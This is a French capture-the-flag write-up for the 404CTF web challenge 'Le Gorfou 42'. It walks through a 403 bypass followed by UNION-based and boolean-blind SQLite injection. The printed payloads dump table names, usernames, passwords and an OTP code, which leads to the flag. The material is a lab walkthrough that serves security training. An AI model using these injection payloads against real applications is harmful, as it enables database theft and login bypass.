Web - Le Gorfou 42
======================

Enoncé
------------

Voici le site web du journal de football LE GORFOU 42 ! Il est tout neuf, dispose de quelques articles intéressants et, est super sécurisé... non ?

Auteur : Asumamusa

Résolution
----------------

On a tenter pendant longtemps le champ de recherche ?query (la barre de recherche)

Puis le formulaire de connexion

Puis le crack des cookies de sessions flask après avoir fait /admin et découvert une erreur flask.

Mais toujours rien !

Sur la page admin, on trouve un bypass 403 grâce à Burp Pro ! Mais en faites ça fait juste apparaître la barre de recherche.

Dans le doute je creuse quand même cette page, et bingo !

Enfin un point d'entrée pour une injection SQL : https://le-gorfou-42.challenges.404ctf.fr/%09admin?query=a%27+UNION+SELECT+version%28%29%2Cnull%3B+-+--# 

On test un 
.. code-block:: console
		
	a' UNION SELECT NULL 
        ==> Mauvais nombre de colonne
    a' UNION SELECT NULL,NULL 
        ==> Erreur 500
    a' UNION SELECT NULL,NULL,NULL 
        ==> Mauvais nombre de colonne
    a' UNION SELECT 1,2; - --UNION SELECT NULL,NULL 
        ==> Erreur 500
    a' UNION SELECT "a","b"--+ 
        ==> No colomn "a"
    a' ORDER BY 4--+  
        ==> 1st ORDER BY term out of range - should be between 1 and 2  
    a' UNION SELECT sqlite_version(),"a"; - --
        ==> Pas de fonction sqlite_version

On ne sait toujours pas sur quel SGBD on tente de faire l'injection (Mysql, sqlite, pgsql, ...)

Donc on continue de chercher, et c'est bien du sqlite : 

.. code-block:: console
		
	a' AND 1=2 UNION SELECT 1, name from sqlite_master--

On est donc sur SQLITE ! Et on a le nom des tables.

Pour avoir le nom des colonnes : 

.. code-block:: console
		
	a' AND 1=2 UNION SELECT 1,sql  FROM sqlite_master  WHERE type = 'table' AND name = 'Xx_US3RS_xX';--

Voici le nom des colonnes : 

- Username : Xx_US3RNAM3_xX
- Password : Xx_PASSW0RD_xX

On va donc récupérer les username : 

.. code-block:: console
		
	a' AND 1=2 UNION SELECT 1,Xx_US3RNAM3_xX  FROM Xx_US3RS_xX ;-- 

On obtient ceci : 
- Xx_ADMINISTRAT0R_xX
- journaliste_du_54
- journaliste_du_57

Et maintenant leur mot de passe : 

.. code-block:: console
		
	a' AND 1=2 UNION SELECT 1,Xx_PASSW0RD_xX  FROM Xx_US3RS_xX ;-- 

Les mots de passe dans le même ordre : 

- Mk$nj5KzAE4Rg#
- K#fBZM!4A593aN
- bQ3M^5RpjzVy^k

On se connecte, et on nous demande un code OTP ! God ! Une autre injection ! 

Erreur intéressante : 

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX'); 
        ==> ERREUR You can only execute one statement at a time.
    Xx_ADMINISTRAT0R_xX'); --
        ==> Code Incorrect

Et on sait que la colonne "code" n'existe pas, mais par contre Xx_C0D3_xX existe bien grâce a ce payload : 

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX'  OR code='a' OR '1'='1 --
        ==> no such table code
    Xx_ADMINISTRAT0R_xX'  OR Xx_C0D3_xX='a' OR '1'='1 --  
        ==> code incorrect

On va devoir faire du boolean blind : 
- Quand c'est faux : utilisateur incorrect
- Quand c'est vrai : code incorrect


On va essayer d'allez creshendo : 

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX'  and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < 2) -- # false
    Xx_ADMINISTRAT0R_xX'  and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < 3) -- # true

On récupère la taille du nom de la table : 

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=1) --

Résultat avec Burp : 11

Bon pi finalement on va exfiltrer le code OTP en reprenant le nom des tables et colonnes connues : 

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX' and (SELECT hex(substr(Xx_C0D3_xX,1,1)) FROM Xx_US3RS_xX WHERE Xx_US3RNAM3_xX='Xx_ADMINISTRAT0R_xX' limit 1 offset 0) > hex('a')) --

On va changer un peu le payload pour plus de précision. On va utiliser "=" plutôt que ">"

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX' and (SELECT hex(substr(Xx_C0D3_xX,1,1)) FROM Xx_US3RS_xX WHERE Xx_US3RNAM3_xX='Xx_ADMINISTRAT0R_xX' limit 1 offset 0) = hex('a')) --

On met le bon charset dans burp suite : 

.. code-block:: console
		
	0123456789abcdefghijklmnopqrstuvwxyz#([-_)$!,'

Et pour chaque caractère on regarde le seul résultat qui donne "Code incorrect" :

.. code-block:: console
		
	Xx_ADMINISTRAT0R_xX' and (SELECT hex(substr(Xx_C0D3_xX,1,1)) FROM Xx_US3RS_xX WHERE Xx_US3RNAM3_xX='Xx_ADMINISTRAT0R_xX' limit 1 offset 0) = hex('a')) --
    Xx_ADMINISTRAT0R_xX' and (SELECT hex(substr(Xx_C0D3_xX,2,1)) FROM Xx_US3RS_xX WHERE Xx_US3RNAM3_xX='Xx_ADMINISTRAT0R_xX' limit 1 offset 0) = hex('a')) --
    ...
    Xx_ADMINISTRAT0R_xX' and (SELECT hex(substr(Xx_C0D3_xX,14,1)) FROM Xx_US3RS_xX WHERE Xx_US3RNAM3_xX='Xx_ADMINISTRAT0R_xX' limit 1 offset 0) = hex('a')) --

Le code OTP complet : WS4$4#4G6Pwose

On se connecte et on a le flag : 

**404CTF{Xx-@LL-MY-H0MI3Z-LUV-SQLI-xX}**